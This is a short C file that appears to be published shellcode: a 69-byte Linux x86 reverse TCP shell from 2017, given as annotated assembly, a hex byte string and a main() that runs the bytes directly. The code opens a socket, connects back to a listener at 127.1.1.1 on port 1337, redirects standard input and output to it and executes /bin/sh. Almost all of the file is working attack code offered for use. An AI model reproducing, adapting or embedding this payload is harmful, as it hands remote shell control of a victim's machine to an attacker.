#include <stdio.h>

/*
Reverse TCP Shell (/bin/sh) -- 69 Bytes -- 16JAN2017 -- icon

//open local socket
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  89 c3                   mov    ebx,eax
5:  43                      inc    ebx
6:  53                      push   ebx
7:  6a 02                   push   0x2
9:  04 66                   add    al,0x66
b:  89 e1                   mov    ecx,esp
d:  cd 80                   int    0x80
//connect socket back to remote listener
f:  68 7f 01 01 01          push   0x101017f  <--127.1.1.1
14: 66 68 05 39             pushw  0x3905     <--1337
18: 43                      inc    ebx
19: 66 53                   push   bx
1b: 89 e1                   mov    ecx,esp
1d: 6a 10                   push   0x10
1f: 51                      push   ecx
20: 50                      push   eax
21: 89 e1                   mov    ecx,esp
23: 43                      inc    ebx
24: b0 66                   mov    al,0x66
26: cd 80                   int    0x80
//dup loop - dup2 2-0 to new socket fd
28: 6a 02                   push   0x2
2a: 59                      pop    ecx
2b: b0 3f                   mov    al,0x3f
2d: cd 80                   int    0x80
2f: 49                      dec    ecx
30: 79 f9                   jns    0x2b
//execve /bin/sh
32: b0 0b                   mov    al,0xb
34: 41                      inc    ecx
35: 89 ca                   mov    edx,ecx
37: 51                      push   ecx
38: 68 2f 2f 73 68          push   0x68732f2f
3d: 68 2f 62 69 6e          push   0x6e69622f
42: 89 e3                   mov    ebx,esp
44: cd 80                   int    0x80
*/

char reverse_tcp[] = \
"\x31\xC0\x50\x89\xC3\x43\x53\x6A\x02\x04\x66\x89\xE1\xCD\x80"
"\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A"
"\x10\x51\x50\x89\xE1\x43\xB0\x66\xCD\x80\x6A\x02\x59\xB0\x3F"
"\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x51\x68\x2F\x2F\x73"
"\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80";

int main(int argc, char **argv){
  int (*test)() = (int(*)())reverse_tcp;
	test();
}
